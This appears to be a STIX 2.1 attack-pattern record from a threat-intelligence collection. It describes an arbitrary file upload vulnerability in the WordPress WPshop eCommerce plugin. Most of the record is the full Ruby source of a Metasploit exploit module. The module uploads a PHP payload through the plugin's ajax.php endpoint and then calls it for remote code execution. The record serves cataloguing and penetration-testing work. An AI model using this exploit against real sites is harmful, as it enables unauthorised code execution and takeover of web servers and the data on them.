{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c32033d-0da5-47be-bf42-451a587034f2",
    "created": "2024-08-14T17:13:24.221231Z",
    "modified": "2024-08-14T17:13:24.221234Z",
    "name": "WordPress WPshop eCommerce Arbitrary File Upload Vulnerability",
    "description": " This module exploits an arbitrary file upload in the WordPress WPshop eCommerce plugin from version 1.3.3.3 to 1.3.9.5. It allows to upload arbitrary PHP code and get remote code execution. This module has been tested successfully on WordPress WPshop eCommerce 1.3.9.5 with WordPress 4.1.3 on Ubuntu 14.04 Server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_wpshop_ecommerce_file_upload.rb",
            "external_id": "wp_wpshop_ecommerce_file_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7830"
        },
        {
            "source_name": "reference",
            "url": "https://research.g0blin.co.uk/g0blin-00036/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress WPshop eCommerce Arbitrary File Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload in the WordPress WPshop eCommerce plugin\n        from version 1.3.3.3 to 1.3.9.5. It allows to upload arbitrary PHP code and get remote\n        code execution. This module has been tested successfully on WordPress WPshop eCommerce\n        1.3.9.5 with WordPress 4.1.3 on Ubuntu 14.04 Server.\n      },\n      'Author'         =>\n        [\n          'g0blin', # Vulnerability Discovery, initial msf module\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'  # Metasploit Module Pull Request\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['WPVDB', '7830'],\n          ['URL', 'https://research.g0blin.co.uk/g0blin-00036/']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['WPshop eCommerce 1.3.9.5', {}]],\n      'DisclosureDate' => '2015-03-09',\n      'DefaultTarget'  => 0)\n    )\n  end\n\n  def check\n    check_plugin_version_from_readme('wpshop', '1.3.9.6', '1.3.3.3')\n  end\n\n  def exploit\n    php_page_name = rand_text_alpha(5 + rand(5)) + '.php'\n\n    data = Rex::MIME::Message.new\n    data.add_part('ajaxUpload', nil, nil, 'form-data; name=\"elementCode\"')\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"wpshop_file\\\"; filename=\\\"#{php_page_name}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi(\n      'uri'       => normalize_uri(wordpress_url_plugins, 'wpshop', 'includes', 'ajax.php'),\n      'method'    => 'POST',\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => post_data\n    )\n\n    if res\n      if res.code == 200 && res.body =~ /#{php_page_name}/\n        print_good(\"Payload uploaded as #{php_page_name}\")\n        register_files_for_cleanup(php_page_name)\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n      end\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Server did not answer\")\n    end\n\n    print_status(\"Calling payload...\")\n    send_request_cgi(\n      { 'uri' => normalize_uri(wordpress_url_wp_content, 'uploads', php_page_name) },\n      5\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-09",
    "x_mitre_platforms": [
        "php'"
    ]
}